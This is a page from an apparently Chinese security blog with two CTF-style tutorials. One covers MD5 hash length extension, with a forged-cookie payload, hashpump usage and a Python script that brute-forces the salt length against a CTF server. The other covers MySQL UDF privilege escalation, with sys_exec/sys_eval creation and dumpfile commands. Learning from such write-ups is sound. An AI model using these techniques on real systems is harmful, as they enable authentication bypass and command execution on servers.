
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>离怀秋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="离怀秋">
<meta property="og:url" content="http://yoursite.com/page/8/index.html">
<meta property="og:site_name" content="离怀秋">
<meta property="article:author" content="离怀秋">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="离怀秋" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">离怀秋</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">心未死 战未败</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="yoursite.com">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main">
  
    <article id="post-hash长度扩展攻击" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/" class="article-date">
  <time datetime="2019-06-01T08:26:23.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/">hash长度扩展攻击</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Hash加密原理"><a href="#Hash加密原理" class="headerlink" title="Hash加密原理"></a>Hash加密原理</h3><p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpaoz491j30j60alwhy.jpg" alt=""></p>
<p>补位过程：对于hash加密，首先对要加密的字符串字节数除64，取得余数，如果余数是56的话，那么就在字符串后面加上八个字节大小的长度描述(用’位’来描述字符串字节的大小，例如字符串“abc”，大小为三个字节，24bit，换算为16进制就是<code>0x18</code>，后面跟上7个字节<code>0x00</code>这里具体的补位在后面还会详细说明；如果余数不是56的话，需要先进行补足56字节，第一个填充字节为<code>0x80</code>,十六进制的<code>0x80</code>也就是二进制的10000000，其余字节用<code>0x00</code>去填充，一直填充到56字节，再进行计算字符串的位数，用后面8个字节对字符串的长度进行描述</p>
<p>生成hash值过程：以64字节为一组，能分为多少组，就需要经过多少次”复杂的数学运算”,每次进行复杂的数学计算都会产生新的register值来给下一次复杂的数学运算来调用，再次生成新的register值，再给下一次复杂的数学运算调用…….，而且每个程序的哈希初始值是默认且唯一的，这样就可以保证每一个字符串的哈希值是唯一的，分两种实际情况进行一次叙述，例如字符串abc，不满56，先进行<code>0x80</code>,<code>0x00</code>补足，而后进行8字节字符串描述，这个只能分为一组，所以只进行一次复杂的数学运算，将程序默认初值<code>register0</code>进行一次复杂的数学运算，生成最终的hash值</p>
<h3 id="用winhex复现过程"><a href="#用winhex复现过程" class="headerlink" title="用winhex复现过程"></a>用winhex复现过程</h3><p>这里自己的博客上传本地图片分辨率会出现很大的问题，所以直接从其他师傅的blog上拿了几张图片</p>
<p>对abc的md5数值进行计算，首先这三个字符有一个16进制转化</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpccqcc0j30kp02l742.jpg" alt=""></p>
<p>首先进行56字节补足</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpci4p4nj30lc03umx5.jpg" alt=""></p>
<p>然后进行字节长度描述</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpd4cvw4j30kx03nq2y.jpg" alt=""></p>
<p><strong>这里还需要提一下md5的特殊的储存方式：</strong></p>
<p>md5使用的是小端储存，具体的储存问题讲解，见这篇博客<a href="https://blog.csdn.net/github_35681219/article/details/52743142" target="_blank" rel="noopener">https://blog.csdn.net/github_35681219/article/details/52743142</a>，这篇博客讲述了md5算法的具体实现。这里大概说一下也就是如果这个字节最后转化为byte时的值是<code>**0****x123**</code>，</p>
<p>那么最后八位就是<code>23 01 00 00 00 00 00 00</code>这也就是所谓的小端储存</p>
<h3 id="浅谈计算与覆盖"><a href="#浅谈计算与覆盖" class="headerlink" title="浅谈计算与覆盖"></a>浅谈计算与覆盖</h3><p>首先生成一个初始链变量</p>
<blockquote>
<p>A=0x1314343</p>
<p>B=0x3435323</p>
<p>C=0x4532434</p>
<p>D=0x13142112</p>
</blockquote>
<p>通过四个非线性函数，将A,B,C,D的值也就是四个链条变量的值与字符串进行复杂的数学运算，最终生成新的四个链条变量，覆盖最初的链条变量，这个点也就是hash长度扩展攻击所利用的点。</p>
<p>接下来用几道题目进行一下哈希长度扩展攻击的应用</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"secret.php"</span>;</span><br><span class="line">@$username=(string)$_POST[<span class="string">'username'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">($text)</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $key;</span><br><span class="line"><span class="keyword">return</span> md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(enc($username) === $_COOKIE[<span class="string">'verify'</span>])&#123;</span><br><span class="line"><span class="keyword">if</span>(is_numeric(strpos($username, <span class="string">"admin"</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>($flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"you are not admin"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">setcookie(<span class="string">"verify"</span>, enc(<span class="string">"guest"</span>), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">setcookie(<span class="string">"len"</span>, strlen($key), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
</blockquote>
<p>首先对代码进行分析，这里题目会给出len的长度为46，通过这里可以知道$key的长度是46,而且还知道了md5($key.”guest”)的值为<code>78cfc57d983b4a17e55828c001a3e781</code>，这里又是没图的，所以只能口述条件了，通过post的username,必须其中要包含admin，而且<code>enc($username) === $_COOKIE[&#39;verify&#39;])</code>，这里如果直接post，admin的话，因为我们根本不知道第一次的默认register的值也不知道key的值，所以无法通过cookie将构造的md5值传入，所以需要考虑hash长度扩展攻击去覆盖第一个md5值生成一个新的由链变量和字符串经过非线性函数生成的新的md5值，这里还得用图，不然说不清，还得拿图，(得尽快解决一下上传图片分辨率不行的问题了)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpdxs9a9j30lz03jmx8.jpg" alt=""></p>
<p>$key的长度是46位，所以前面可以用任意的46个字符去填充，之后写入guest，然后去用八个字节去描述长度51字节，最后再八个字节的后面加上admin</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpekpoazj30lo04ft8v.jpg" alt=""></p>
<p>最后将前面的无效字符去掉，变成了(因为这里前面有一个$key的链接)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</span><br></pre></td></tr></table></figure>

<p>然而将这个进行urlencode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin</span><br></pre></td></tr></table></figure>

<p>这个就是要传入的<code>username</code>变量值，然后通过工具<code>hashpump</code></p>
<p><img src="https://i.imgur.com/05WwBNT.png" alt="img"></p>
<p><code>第一行是得到的hash值,即hash(key.guest)</code><br><code>第二行是已知数据,即guest</code><br><code>第三行是总长度</code><br><code>第四行是要添加的数据 写入admin</code>这里不是对应的图，传不了图好难受orz</p>
<p>最终将md5值换入，和username写入</p>
<p>大体思路总结，因为为止$key的值，而且还要在新的变量中包含admin，这样可以用这个哈希长度扩展攻击，去覆盖之前的md5值生成新的md5值，而且满足了包含admin变量的这个条件</p>
<h3 id="md5-salt-value"><a href="#md5-salt-value" class="headerlink" title="md5($salt.$value)"></a>md5($salt.$value)</h3><p><strong>已知$salt长度</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!empty($_COOKIE[“getmein”])) &#123;</span><br><span class="line">if (urldecode($username) &#x3D;&#x3D;&#x3D; “admin” &amp;&amp; urldecode($password) !&#x3D; “admin”) &#123;</span><br><span class="line">if ($COOKIE[“getmein”] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">echo “Congratulations! You are a registered user.\n”;</span><br><span class="line">die (“The flag is “. $flag);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">die (“Your cookies don’t match up! STOP HACKING THIS SITE.”);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">die (“You are not an admin! LEAVE.”);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">setcookie(“sample-hash”, md5($secret . urldecode(“admin” . “admin”)), time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#x2F;&#x2F;secret为15位</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对于这种题，直接上工具就行，输入第一次进行复杂运算后的md5值，然后补全位数，用第二次生成的Md5值直接进行覆盖，然后把工具生成的md5也提交过去，就好了</p>
<p>未知$salt长度</p>
<p>贴一下代码并且审计一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$auth &#x3D; false;</span><br><span class="line">$role &#x3D; “guest”;</span><br><span class="line">$salt &#x3D;</span><br><span class="line">if (isset($_COOKIE[“role”])) &#123;</span><br><span class="line">$role &#x3D; unserialize($_COOKIE[“role”]);</span><br><span class="line">$hsh &#x3D; $_COOKIE[“hsh”];</span><br><span class="line">if ($role&#x3D;&#x3D;&#x3D;”admin” &amp;&amp; $hsh &#x3D;&#x3D;&#x3D; md5($salt.strrev($_COOKIE[“role”]))) &#123;</span><br><span class="line">$auth &#x3D; true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$auth &#x3D; false;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$s &#x3D; serialize($role);</span><br><span class="line">setcookie(‘role’,$s);</span><br><span class="line">$hsh &#x3D; md5($salt.strrev($s));</span><br><span class="line">setcookie(‘hsh’,$hsh);</span><br><span class="line">&#125;</span><br><span class="line">if ($auth) &#123;</span><br><span class="line">echo “&lt;h3&gt;Welcome Admin. Your flag is</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo “&lt;h3&gt;Only Admin can see the flag!!&lt;&#x2F;h3&gt;”;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里或许唯一大概不同的就是<code>strrev函数</code>，进行一个字符串翻转，大体意思仍然能相同，通过<code>$hsh = md5($salt.strrev($s));</code>我们可以得到第一次经过这个$salt长度进行哈希加密的值，然后同样去和新的第二个新值去进行第二次复杂的数学运算生成新的Md5值覆盖掉之前的md5，而且这里unserilized反序列化存在00截断，也就是说没有翻转过来的字符串前面的形式时<code>s:5:&quot;admin&quot;%00(balabala)</code>进行反序列化后成功构造完毕满足了等于’admin’这个条件，后面将这个字符串翻转过来，成功构造哈希扩展攻击漏洞，生成新的md5值，经过cookie传一下就好，这里我们唯一需要爆破的是$salt的长度，贴下脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">for i in range(0,15):</span><br><span class="line">url&#x3D;’http:&#x2F;&#x2F;web.jarvisoj.com:32778&#x2F;’</span><br><span class="line">m&#x3D;hashpumpy.hashpump(‘3a4727d57463f122833d9e732f94e4e0′,’;\”tseug\”:5:s’,’;\”nimda\”:5:s’,i)</span><br><span class="line">print i</span><br><span class="line">a&#x3D;m[1][::-1]</span><br><span class="line">b&#x3D;m[0]</span><br><span class="line">a1han&#x3D;urllib.quote(a)</span><br><span class="line">cookie&#x3D;&#123;</span><br><span class="line">‘role’:a1han,</span><br><span class="line">‘hsh’:b &#125;</span><br><span class="line">r&#x3D;requests.get(url,cookies&#x3D;cookie)</span><br><span class="line">if ‘welcome’ in r.text:</span><br><span class="line">print r.text</span><br><span class="line">break</span><br></pre></td></tr></table></figure>

<p>这里需要说明一下的是requests会对post和url的内容进行自动编码，而对cookies的内容不会编码，所以我们要手动进行urllib.quote进行编码。</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/" data-id="ckabsu38v002rkkvrffa8c674" class="article-share-link" data-share="baidu" data-title="hash长度扩展攻击">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-udf提权复现" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/udf%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2019-06-01T08:22:41.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/udf%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/">udf提权复现</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Windows平台"><a href="#Windows平台" class="headerlink" title="Windows平台"></a>Windows平台</h2><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。</p>
<ul>
<li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/</li>
<li>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。</li>
<li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</li>
<li>拥有可以将udf.dll写入相应目录的权限。</li>
</ul>
<p>这里我用的是phpstudy上的mysql作为对象，udt提权所需的文件在sqlmap上是有的，因为sqlmap也能udf提权，大多数mysql是32位的，udf.dll所用的是异或编码，使用前需要进行解码<code>cloak.py</code>,解码完毕后会在当前目录生成你所需的文件</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2roegm93qj31b20kk42f.jpg" alt=""></p>
<p>成功生成所需提权文件，然后将文件放到Mysql下<code>lib/plugin</code>目录下，在mysql执行创建函数命令，</p>
<p>命令格式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function you_want returns string soname &quot;lib_mysqludf_dll&quot;;</span><br></pre></td></tr></table></figure>

<p>例如我可以通过创建sys_exec命令执行函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create function sys_exec returns string soname &quot;lib_mysqludt_dll&quot;;</span><br><span class="line">select sys_exec(&#39;calc&#39;); 调用函数</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rof0vr2oj31br0p748q.jpg" alt=""></p>
<p>udf.dll是16进制文件，我们可以用winhex查看可用函数</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rof7zhe5j30xt0fkwgb.jpg" alt=""></p>
<p>这些都为可调用函数</p>
<h2 id="Linux下udf提权"><a href="#Linux下udf提权" class="headerlink" title="Linux下udf提权"></a>Linux下udf提权</h2><p>其实linux下提权套路相同，只不过两个平台下提权方法都各种两种，第一种是提取文件的16进制形式生成新的16进制，第二就是用cloak.py去解码异或编码文件，先解决一下简单的方法</p>
<p><strong>测试环境Ubuntu18.04</strong></p>
<p>同样利用sqlmap  <code>python cloak.py -d -i &lt;文件&gt;</code> 得到以.so(linux下与window不同之处.dll与.so)，将这个文件同样放到/lib/plugin目录下</p>
<p>同样操作</p>
<p>create function sys_eval returns string soname “lib_mysqludf_so”</p>
<p>select sys_eval(‘whoami’);</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rofick8bj30i704njsr.jpg" alt=""></p>
<p>得到mysql权限，在Ubuntu下一定要以root权限启动，否则在查询<code>whoami</code>时返回Null</p>
<p>检查一下此时的函数功能都有哪些</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rogc1rn0j30o305zjsy.jpg" alt=""></p>
<p>通过探测发现我们可以通过这个功能进行反弹shell</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rofz1u1bj31b30d4wn1.jpg" alt=""></p>
<p>成功反弹shell</p>
<p>而且在mysql&gt;5.1版本下可以执行system语句</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpggy1g2rogmzfv7j316f06tdkv.jpg" alt=""></p>
<p>最后在介绍一下我在linux下未成功的16进制写入，感觉这个方法就比较麻烦了，还要拥有Mysql下的写入写出权限</p>
<p>流程如下</p>
<p>将sqlmap里面的文件转化为16进制写入临时目录下的udf.txt文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(load_file(&#39;&#x2F;pentest&#x2F;database&#x2F;sqlmap&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so&#39;)) into outfile &#39;&#x2F;tmp&#x2F;udf.txt&#39;;</span><br></pre></td></tr></table></figure>

<p>将udf.txt文件中的16进制形式用unhex去解码并转到/lib/plugin目录下的udf.so</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&#39;7F454C46020...&#39;) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;mysqludf.so&#39;;</span><br></pre></td></tr></table></figure>

<p>之后的操作正常进行，不过不知什么原因udf.txt的内容在我的Ubuntu下一直为空</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/udf%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/" data-id="ckabsu38z0032kkvrf01h2i51" class="article-share-link" data-share="baidu" data-title="udf提权复现">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/udf%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/7/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span>
  </nav>
</section>
      
      <aside id="sidebar">
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">30</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">26</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" rel="tag">生活随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12.5px;">Crypto</a> <a href="/tags/WEB%E5%AE%89%E5%85%A8/" style="font-size: 10px;">WEB安全</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 17.5px;">Web安全</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">生活随笔</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">21</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">Apache Common Collections 反序列化分析学习</a>
          </li>
        
          <li>
            <a href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
          </li>
        
          <li>
            <a href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/">VolgaCTF 2020 Qualifier-Web</a>
          </li>
        
          <li>
            <a href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
          </li>
        
          <li>
            <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascript中变量声明带来的Tags Broken</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Links</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="http://arvinxiang.com" target="_blank">主题作者</a>
          </li>
        
          <li>
            <a href="http://reqianduan.com" target="_blank">热前端</a>
          </li>
        
          <li>
            <a href="http://yuancheng.work" target="_blank">远程.work</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 离怀秋<br>
      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="totop"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<!-- 多说公共js代码 start -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"reqianduan"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- 多说公共js代码 end -->


<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
